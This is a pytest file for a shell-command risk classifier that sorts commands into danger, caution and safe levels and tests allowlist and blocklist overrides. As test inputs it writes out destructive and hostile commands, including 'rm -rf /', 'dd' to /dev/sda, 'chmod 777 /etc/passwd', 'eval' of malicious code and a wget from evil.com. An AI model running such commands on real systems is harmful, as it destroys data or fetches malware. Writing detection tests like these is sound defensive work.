"""Tests for command risk assessment."""

import pytest
from unworldly.command_risk import assess_command_risk, CommandRiskConfig
from unworldly.types import RiskLevel


class TestAssessCommandRisk:
    class TestDangerPatterns:
        def test_flag_rm_rf_as_danger(self):
            result = assess_command_risk("rm", ["-rf", "/"])
            assert result.level == RiskLevel.DANGER
            assert "Destructive" in result.reason

        def test_flag_sudo_as_danger(self):
            result = assess_command_risk("sudo", ["apt", "install", "pkg"])
            assert result.level == RiskLevel.DANGER
            assert "Elevated privilege" in result.reason

        def test_flag_curl_as_danger(self):
            result = assess_command_risk("curl", ["http://example.com/payload"])
            assert result.level == RiskLevel.DANGER
            assert "Network request" in result.reason

        def test_flag_wget_as_danger(self):
            result = assess_command_risk("wget", ["http://evil.com/malware"])
            assert result.level == RiskLevel.DANGER
            assert "Network download" in result.reason

        def test_flag_chmod_777_as_danger(self):
            result = assess_command_risk("chmod", ["777", "/etc/passwd"])
            assert result.level == RiskLevel.DANGER
            assert "world-writable" in result.reason

        def test_flag_kill_9_as_danger(self):
            result = assess_command_risk("kill", ["-9", "1234"])
            assert result.level == RiskLevel.DANGER
            assert "Force-killing" in result.reason

        def test_flag_dd_as_danger(self):
            result = assess_command_risk("dd", ["if=/dev/zero", "of=/dev/sda"])
            assert result.level == RiskLevel.DANGER
            assert "disk" in result.reason

        def test_flag_eval_as_danger(self):
            result = assess_command_risk("eval", ["$(malicious_code)"])
            assert result.level == RiskLevel.DANGER
            assert "Dynamic code" in result.reason

        def test_flag_git_push_force_as_danger(self):
            result = assess_command_risk("git", ["push", "--force"])
            assert result.level == RiskLevel.DANGER
            assert "Force-pushing" in result.reason

        def test_flag_git_reset_hard_as_danger(self):
            result = assess_command_risk("git", ["reset", "--hard"])
            assert result.level == RiskLevel.DANGER
            assert "Hard reset" in result.reason

    class TestCautionPatterns:
        def test_flag_npm_install_as_caution(self):
            result = assess_command_risk("npm", ["install", "lodash"])
            assert result.level == RiskLevel.CAUTION
            assert "npm package" in result.reason

        def test_flag_pip_install_as_caution(self):
            result = assess_command_risk("pip", ["install", "requests"])
            assert result.level == RiskLevel.CAUTION
            assert "Python package" in result.reason

        def test_flag_git_push_as_caution(self):
            result = assess_command_risk("git", ["push", "origin", "main"])
            assert result.level == RiskLevel.CAUTION
            assert "Pushing" in result.reason

        def test_flag_docker_run_as_caution(self):
            result = assess_command_risk("docker", ["run", "nginx"])
            assert result.level == RiskLevel.CAUTION
            assert "Docker container" in result.reason

        def test_flag_npx_as_caution(self):
            result = assess_command_risk("npx", ["some-package"])
            assert result.level == RiskLevel.CAUTION
            assert "npm package" in result.reason

    class TestSafePatterns:
        def test_flag_git_add_as_safe(self):
            result = assess_command_risk("git", ["add", "."])
            assert result.level == RiskLevel.SAFE

        def test_flag_git_status_as_safe(self):
            result = assess_command_risk("git", ["status"])
            assert result.level == RiskLevel.SAFE

        def test_flag_ls_as_safe(self):
            result = assess_command_risk("ls", ["-la"])
            assert result.level == RiskLevel.SAFE

        def test_flag_npm_test_as_safe(self):
            result = assess_command_risk("npm", ["test"])
            assert result.level == RiskLevel.SAFE

        def test_flag_npm_run_build_as_safe(self):
            result = assess_command_risk("npm", ["run", "build"])
            assert result.level == RiskLevel.SAFE

        def test_flag_tsc_as_safe(self):
            result = assess_command_risk("tsc", [])
            assert result.level == RiskLevel.SAFE

    class TestUnknownCommands:
        def test_default_unknown_commands_to_safe(self):
            result = assess_command_risk("my-custom-tool", ["arg1", "arg2"])
            assert result.level == RiskLevel.SAFE
            assert result.reason == "Standard command"

    class TestCustomConfig:
        def test_allow_custom_allowlist_to_override_defaults(self):
            config = CommandRiskConfig(
                allowlist=[{"pattern": "curl", "risk": "safe", "reason": "Internal API call"}],
                blocklist=[],
            )
            result = assess_command_risk("curl", ["http://internal-api.local"], config)
            assert result.level == RiskLevel.SAFE
            assert result.reason == "Internal API call"

        def test_allow_custom_blocklist_to_flag_as_danger(self):
            config = CommandRiskConfig(
                allowlist=[],
                blocklist=[{"pattern": "bad-tool", "risk": "danger", "reason": "Known malicious"}],
            )
            result = assess_command_risk("bad-tool", ["--exploit"], config)
            assert result.level == RiskLevel.DANGER
            assert result.reason == "Known malicious"

        def test_check_config_before_defaults(self):
            config = CommandRiskConfig(
                allowlist=[{"pattern": "rm -rf", "risk": "safe", "reason": "Approved cleanup script"}],
                blocklist=[],
            )
            result = assess_command_risk("rm", ["-rf", "temp/"], config)
            assert result.level == RiskLevel.SAFE
            assert result.reason == "Approved cleanup script"
